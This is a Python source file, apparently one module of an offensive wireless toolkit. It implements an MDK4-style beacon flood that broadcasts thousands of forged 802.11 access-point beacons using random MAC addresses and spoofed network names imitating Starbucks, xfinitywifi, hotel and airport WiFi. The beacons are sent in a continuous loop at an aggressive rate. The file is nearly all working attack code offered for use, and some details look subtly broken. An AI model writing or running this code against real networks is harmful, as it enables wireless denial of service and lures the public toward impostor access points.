"""
Beacon flood attack module (MDK4-style)
Floods area with fake access points
"""

from scapy.all import *
from darknet.core.base import AttackModule
from darknet.core.packet import PacketHandler
from darknet.utils.constants import *
import time
import random
import string


class BeaconFloodAttack(AttackModule):
    """
    Beacon flood attack
    Creates thousands of fake APs to overwhelm WiFi scanners
    MDK4 beacon flood mode
    """

    def __init__(self):
        super().__init__(
            name="Beacon Flood",
            description="Flood area with fake access points (MDK4-style)",
            attack_type=ATTACK_BEACON_FLOOD
        )
        self.channel = 6
        self.count = 1000
        self.rate = INJECTION_RATE_AGGRESSIVE
        self.random_ssids = True
        self.random_macs = True
        self.encryption_types = [ENCRYPTION_OPEN, ENCRYPTION_WPA, ENCRYPTION_WPA2]
        self.ssid_list = []

    def setup(self, **kwargs) -> bool:
        """
        Setup beacon flood attack
        Args:
            interface: Wireless interface
            channel: Channel to flood (or 'hop' for channel hopping)
            count: Number of fake APs to create
            rate: Packets per second
            random_ssids: Generate random SSIDs
            ssid_list: Custom SSID list
        """
        try:
            self.interface = kwargs.get('interface')
            self.channel = kwargs.get('channel', 6)
            self.count = kwargs.get('count', 1000)
            self.rate = kwargs.get('rate', INJECTION_RATE_AGGRESSIVE)
            self.random_ssids = kwargs.get('random_ssids', True)
            self.ssid_list = kwargs.get('ssid_list', [])

            if not self.interface:
                self.logger.error("Interface required")
                return False

            self.logger.info(f"Beacon flood configured:")
            self.logger.info(f"  Channel: {self.channel}")
            self.logger.info(f"  Fake APs: {self.count}")
            self.logger.info(f"  Rate: {self.rate} pps")

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def _generate_ssid(self) -> str:
        """Generate random SSID"""
        if self.ssid_list and random.random() > 0.5:
            return random.choice(self.ssid_list)

        # Generate random SSID
        length = random.randint(8, 32)
        patterns = [
            lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=length)),
            lambda: f"Free_WiFi_{random.randint(1000, 9999)}",
            lambda: f"Guest_Network_{random.randint(100, 999)}",
            lambda: f"{''.join(random.choices(string.ascii_uppercase, k=6))}_AP",
            lambda: f"Starbucks_WiFi_{random.randint(1, 100)}",
            lambda: f"Hotel_Guest_{random.randint(1, 500)}",
            lambda: f"Airport_WiFi_{random.randint(1, 50)}",
            lambda: f"xfinitywifi_{random.randint(1000, 9999)}",
        ]

        return random.choice(patterns)()

    def _generate_mac(self) -> str:
        """Generate random MAC address"""
        return "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(6))

    def _create_beacon(self, ssid: str, mac: str, channel: int, encryption: str) -> Packet:
        """Create a beacon packet"""
        dot11 = Dot11(
            type=0,
            subtype=8,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=mac,
            addr3=mac
        )

        # Random capabilities
        cap = 0x1104  # ESS enabled
        if encryption != ENCRYPTION_OPEN:
            cap |= 0x0010  # Privacy

        beacon = Dot11Beacon(cap=cap)
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        dsset = Dot11Elt(ID='DSset', info=chr(channel))

        # Random rates
        rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')

        pkt = RadioTap() / dot11 / beacon / essid / dsset / rates

        # Add encryption info
        if encryption == ENCRYPTION_WPA2:
            rsn = Dot11Elt(ID='RSNinfo', info=(
                b'\x01\x00'
                b'\x00\x0f\xac\x04'
                b'\x01\x00'
                b'\x00\x0f\xac\x04'
                b'\x01\x00'
                b'\x00\x0f\xac\x02'
                b'\x00\x00'
            ))
            pkt = pkt / rsn
        elif encryption == ENCRYPTION_WPA:
            vendor = Dot11Elt(ID=221, info=b'\x00\x50\xf2\x01\x01\x00')
            pkt = pkt / vendor

        return pkt

    def run(self) -> dict:
        """Execute beacon flood attack"""
        try:
            self.logger.attack(f"Starting aggressive beacon flood attack!")
            self.logger.warning("This will create massive wireless interference!")

            # Set channel
            if isinstance(self.channel, int):
                subprocess.run(
                    ['iw', 'dev', self.interface, 'set', 'channel', str(self.channel)],
                    check=True,
                    capture_output=True
                )

            inter = 1.0 / self.rate if self.rate > 0 else 0

            # Generate fake APs
            fake_aps = []
            for i in range(self.count):
                ssid = self._generate_ssid()
                mac = self._generate_mac()
                encryption = random.choice(self.encryption_types)
                channel = self.channel if isinstance(self.channel, int) else random.choice(WIFI_CHANNELS_2GHZ)

                fake_aps.append({
                    'ssid': ssid,
                    'mac': mac,
                    'channel': channel,
                    'encryption': encryption
                })

            self.logger.info(f"Generated {len(fake_aps)} fake APs")

            # Start flooding
            iteration = 0
            while not self._stop_event.is_set():
                # Send beacon for each fake AP
                for ap in fake_aps:
                    if self._stop_event.is_set():
                        break

                    pkt = self._create_beacon(
                        ap['ssid'],
                        ap['mac'],
                        ap['channel'],
                        ap['encryption']
                    )

                    sendp(pkt, iface=self.interface, verbose=False)
                    self.packets_sent += 1

                    if inter > 0:
                        time.sleep(inter)

                iteration += 1

                # Randomize some APs every 10 iterations
                if iteration % 10 == 0:
                    for i in range(min(50, len(fake_aps))):
                        idx = random.randint(0, len(fake_aps) - 1)
                        fake_aps[idx]['ssid'] = self._generate_ssid()
                        fake_aps[idx]['mac'] = self._generate_mac()

                    self.logger.info(f"Sent {self.packets_sent} beacon packets")

            self.logger.success(f"Beacon flood completed: {self.packets_sent} packets sent")

            return {
                'success': True,
                'packets_sent': self.packets_sent,
                'fake_aps': len(fake_aps)
            }

        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop the attack"""
        self._stop_event.set()
        self.logger.info("Stopping beacon flood")

    def cleanup(self):
        """Cleanup resources"""
        pass
